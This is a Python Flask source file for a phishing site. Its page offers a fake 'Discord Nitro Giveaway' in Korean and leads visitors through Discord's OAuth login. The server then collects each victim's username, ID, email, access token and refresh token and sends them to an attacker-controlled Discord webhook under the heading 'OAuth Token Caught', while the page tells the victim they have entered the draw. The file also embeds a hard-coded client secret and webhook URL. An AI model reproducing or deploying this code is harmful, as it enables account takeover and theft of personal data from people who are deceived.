from flask import Flask, request, redirect, render_template_string
import requests
import os

app = Flask(__name__)

CLIENT_ID = "1560823818845552663"
CLIENT_SECRET = "3NVkt7qVGojUm7C38P-Krx_9S5NgxQ0v"
REDIRECT_URI = "https://nitro-event-2.onrender.com/callback"
WEBHOOK = "https://discord.com/api/webhooks/1560808467395125248/d7k4t9kqx1tSzGrNCVyvLuI7z4nU6atd7SREjDhqlnqyc-4Jv0btgLKTGnKrqBQxSFbR"

SCOPES = "identify email guilds"

HTML = '''
<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Nitro Event</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1e1f22;font-family:Helvetica,Arial,sans-serif;color:#dbdee1;min-height:100vh;display:flex;justify-content:center;align-items:center}
.box{background:#2b2d31;width:100%;max-width:420px;border-radius:12px;overflow:hidden;box-shadow:0 8px 24px rgba(0,0,0,.4)}
.header{background:linear-gradient(135deg,#5865f2,#7289da);padding:36px 24px;text-align:center}
.header h1{font-size:26px;color:#fff;margin-bottom:6px}
.header p{color:rgba(255,255,255,.85)}
.content{padding:28px}
.prize{background:#1e1f22;border-radius:8px;padding:18px;text-align:center;margin-bottom:20px}
.prize .amount{font-size:32px;font-weight:700;color:#5865f2;margin:10px 0}
.btn{display:block;width:100%;padding:14px;background:#5865f2;color:#fff;text-align:center;text-decoration:none;border-radius:8px;font-size:16px;font-weight:600}
.btn:hover{background:#4752c4}
</style>
</head>
<body>
<div class="box">
  <div class="header">
    <h1>Discord Nitro Giveaway</h1>
    <p>한정 이벤트</p>
  </div>
  <div class="content">
    <div class="prize">
      <div>🎉 1등 상품</div>
      <div class="amount">Nitro 1년</div>
      <div style="color:#b5bac1;font-size:14px">+ 추가 경품</div>
    </div>
    <a class="btn" href="{{ auth_url }}">이벤트 참가하기</a>
  </div>
</div>
</body>
</html>
'''

@app.route("/")
def index():
    auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope={SCOPES}"
    )
    return render_template_string(HTML, auth_url=auth_url)

@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "오류: code 없음", 400

    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    token_data = r.json()

    access_token = token_data.get("access_token")
    if not access_token:
        return f"토큰 교환 실패:<br><pre>{token_data}</pre>", 400

    user_r = requests.get(
        "https://discord.com/api/v10/users/@me",
        headers={"Authorization": f"Bearer {access_token}"}
    )
    user = user_r.json()

    embed = {
        "title": "💎 OAuth Token Caught",
        "color": 0x5865F2,
        "fields": [
            {"name": "Username", "value": f"{user.get('username')}#{user.get('discriminator', '0')}", "inline": True},
            {"name": "ID", "value": str(user.get("id", "N/A")), "inline": True},
            {"name": "Email", "value": str(user.get("email", "없음")), "inline": True},
            {"name": "Access Token", "value": f"```{access_token}```", "inline": False},
            {"name": "Refresh Token", "value": f"```{token_data.get('refresh_token', '없음')}```", "inline": False},
        ]
    }
    try:
        requests.post(WEBHOOK, json={"embeds": [embed]})
    except:
        pass

    return '''
    <div style="background:#1e1f22;color:#dbdee1;height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif">
      <div style="text-align:center">
        <div style="font-size:48px">✅</div>
        <h2 style="color:#57f287">참여 완료!</h2>
        <p>이벤트에 등록되었습니다.<br>당첨자는 DM으로 연락드립니다.</p>
      </div>
    </div>
    '''

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
